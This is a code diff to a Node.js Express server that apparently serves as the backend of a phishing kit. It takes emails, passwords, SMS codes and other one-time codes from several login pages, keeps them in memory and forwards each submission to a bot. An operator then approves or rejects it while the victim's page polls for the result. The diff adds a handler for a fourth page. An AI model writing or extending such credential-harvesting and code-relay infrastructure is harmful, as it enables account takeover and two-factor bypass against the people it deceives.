@@ -4,7 +4,7 @@ const express = require("express");
 const bodyParser = require("body-parser");
 const cors = require("cors");
 const fetch = require("node-fetch");
-const { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS } = require("./bot");
+const { sendApprovalRequest, sendApprovalRequestGeneric, sendApprovalRequestSMS, sendApprovalRequestPage } = require("./bot");
 
 const app = express();
 const PORT = process.env.PORT || 3000;
@@ -15,6 +15,7 @@ const PORT = process.env.PORT || 3000;
 let pendingUsers = {}; // email/password login
 let pendingCodes = {}; // SMS codes
 let pendingGeneric = {}; // generic codes
+let pendingPage = {}; // page 4 logins
 
 app.use(cors());
 app.use(bodyParser.json());
@@ -26,25 +27,6 @@ app.use(express.static("public"));
 // -----------------
 app.get("/", (req, res) => {
   res.send("✅ Combined Server is running.");
-});
-
-// -----------------
-// Backend for your custom page
-// -----------------
-app.post("/page-login", (req, res) => {
-  const email = (req.body.email || "").trim().toLowerCase();
-  const password = req.body.password;
-
-  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
-
-  // Add to pending users
-  pendingUsers[email] = { password, status: "pending" };
-  console.log(`📥 Page Login Received: ${email}`);
-
-  // Send to bot for approval
-  sendApprovalRequest(email, password);
-
-  res.json({ success: true });
 });
 
 // -----------------
@@ -92,6 +74,22 @@ app.post("/sms-login", (req, res) => {
 });
 
 // -----------------
+// Page 4 Login
+// -----------------
+app.post("/page-login", (req, res) => {
+  const email = (req.body.email || "").trim().toLowerCase();
+  const password = req.body.password;
+
+  if (!email || !password) return res.status(400).json({ success: false, message: "Email and password required" });
+
+  pendingPage[email] = { password, status: "pending" };
+  console.log(`📥 Page 4 Login Received: ${email}`);
+
+  sendApprovalRequestPage(email, password);
+  res.json({ success: true });
+});
+
+// -----------------
 // Check status
 // -----------------
 app.get("/check-status", (req, res) => {
@@ -99,6 +97,7 @@ app.get("/check-status", (req, res) => {
   if (pendingUsers[identifier]) return res.json({ status: pendingUsers[identifier].status });
   if (pendingCodes[identifier]) return res.json({ status: pendingCodes[identifier].status });
   if (pendingGeneric[identifier]) return res.json({ status: pendingGeneric[identifier].status });
+  if (pendingPage[identifier]) return res.json({ status: pendingPage[identifier].status });
   res.json({ status: "unknown" });
 });
 
@@ -117,6 +116,8 @@ app.post("/update-status", (req, res) => {
     pendingCodes[identifier].status = status;
   } else if (pendingGeneric[identifier]) {
     pendingGeneric[identifier].status = status;
+  } else if (pendingPage[identifier]) {
+    pendingPage[identifier].status = status;
   } else {
     return res.json({ ok: false, message: "Identifier not found" });
   }
